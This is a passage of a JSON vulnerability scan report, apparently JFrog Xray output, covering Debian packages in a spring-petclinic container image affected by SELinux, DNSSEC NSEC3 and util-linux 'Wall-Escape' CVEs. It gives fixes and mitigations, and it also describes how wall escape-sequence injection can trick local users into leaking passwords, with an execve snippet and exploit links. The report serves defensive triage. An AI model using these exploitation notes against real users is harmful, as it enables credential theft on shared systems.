               "description": "The CIL compiler in SELinux 3.2 has a use-after-free in __cil_verify_classperms (called from __verify_map_perm_classperms and hashtab_map).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-36085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-178836",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The CIL compiler in SELinux 3.2 has a use-after-free in __cil_verify_classperms (called from __cil_verify_classpermission and __cil_pre_verify_helper).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsepol1",
         "source_id": "deb://debian:bullseye:libsepol1",
         "source_comp_id": "deb://debian:bullseye:libsepol1:3.1-1",
         "component_versions": {
            "id": "debian:bullseye:libsepol",
            "vulnerable_versions": [
               "< 3.1-1+deb11u1"
            ],
            "fixed_versions": [
               "3.1-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-36084",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "3.3/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "The CIL compiler in SELinux 3.2 has a use-after-free in __cil_verify_classperms (called from __cil_verify_classpermission and __cil_pre_verify_helper).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-36084",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-590542",
         "severity": "Unknown",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The Closest Encloser Proof aspect of the DNS protocol (in RFC 5155 when RFC 9276 guidance is skipped) allows remote attackers to cause a denial of service (CPU consumption for SHA-1 computations) via DNSSEC responses in a random subdomain attack, aka the \"NSEC3\" issue. The RFC 5155 specification implies that an algorithm must perform thousands of iterations of a hash function in certain situations.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u6"
            ],
            "fixed_versions": [
               "247.3-7+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50868"
                  }
               ],
               "description": "The Closest Encloser Proof aspect of the DNS protocol (in RFC 5155 when RFC 9276 guidance is skipped) allows remote attackers to cause a denial of service (CPU consumption for SHA-1 computations) via DNSSEC responses in a random subdomain attack, aka the \"NSEC3\" issue. The RFC 5155 specification implies that an algorithm must perform thousands of iterations of a hash function in certain situations.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-590542",
            "VulnerabilityTitle": "",
            "ShortDescription": "Unbounded resource consumption in the DNSSEC extension of the DNS protocol may lead to denial of service in multiple DNS resolvers when resolving a malicious domain.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "DNS resolvers are vulnerable only when enabling DNSSEC validation, which is usually a non-default & rare configuration (excluding CDN providers).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploitation of the vulnerability leads to high resource consumption in the DNS resolver which may lead to denial of service.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker needs to query the vulnerable DNSSEC validator requesting it to resolve his malicious domain, leading to high resource consumption when validating the NSEC3 response from the attacker-controlled nameserver.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Unbound's patch",
                  "Url": "https://github.com/NLnetLabs/unbound/commit/92f2a1ca690a44880f4c4fa70a4b5a4b029aaf1c",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "BIND9 advisory",
                  "Url": "https://kb.isc.org/docs/cve-2023-50868",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "cve_id": "CVE-2023-50868",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Use of dnssec validation was not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "vulnerability_id": "CVE-2023-50868",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-590542",
         "severity": "Unknown",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The Closest Encloser Proof aspect of the DNS protocol (in RFC 5155 when RFC 9276 guidance is skipped) allows remote attackers to cause a denial of service (CPU consumption for SHA-1 computations) via DNSSEC responses in a random subdomain attack, aka the \"NSEC3\" issue. The RFC 5155 specification implies that an algorithm must perform thousands of iterations of a hash function in certain situations.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u6"
            ],
            "fixed_versions": [
               "247.3-7+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50868"
                  }
               ],
               "description": "The Closest Encloser Proof aspect of the DNS protocol (in RFC 5155 when RFC 9276 guidance is skipped) allows remote attackers to cause a denial of service (CPU consumption for SHA-1 computations) via DNSSEC responses in a random subdomain attack, aka the \"NSEC3\" issue. The RFC 5155 specification implies that an algorithm must perform thousands of iterations of a hash function in certain situations.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-590542",
            "VulnerabilityTitle": "",
            "ShortDescription": "Unbounded resource consumption in the DNSSEC extension of the DNS protocol may lead to denial of service in multiple DNS resolvers when resolving a malicious domain.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "DNS resolvers are vulnerable only when enabling DNSSEC validation, which is usually a non-default & rare configuration (excluding CDN providers).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Exploitation of the vulnerability leads to high resource consumption in the DNS resolver which may lead to denial of service.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker needs to query the vulnerable DNSSEC validator requesting it to resolve his malicious domain, leading to high resource consumption when validating the NSEC3 response from the attacker-controlled nameserver.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Unbound's patch",
                  "Url": "https://github.com/NLnetLabs/unbound/commit/92f2a1ca690a44880f4c4fa70a4b5a4b029aaf1c",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "BIND9 advisory",
                  "Url": "https://kb.isc.org/docs/cve-2023-50868",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "cve_id": "CVE-2023-50868",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Use of dnssec validation was not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
            "vulnerability_id": "CVE-2023-50868",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libuuid1",
         "source_id": "deb://debian:bullseye:libuuid1",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:mount",
         "source_id": "deb://debian:bullseye:mount",
         "source_comp_id": "deb://debian:bullseye:mount:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:bsdutils",
         "source_id": "deb://debian:bullseye:bsdutils",
         "source_comp_id": "deb://debian:bullseye:bsdutils:1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:util-linux",
         "source_id": "deb://debian:bullseye:util-linux",
         "source_comp_id": "deb://debian:bullseye:util-linux:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsmartcols1",
         "source_id": "deb://debian:bullseye:libsmartcols1",
         "source_comp_id": "deb://debian:bullseye:libsmartcols1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
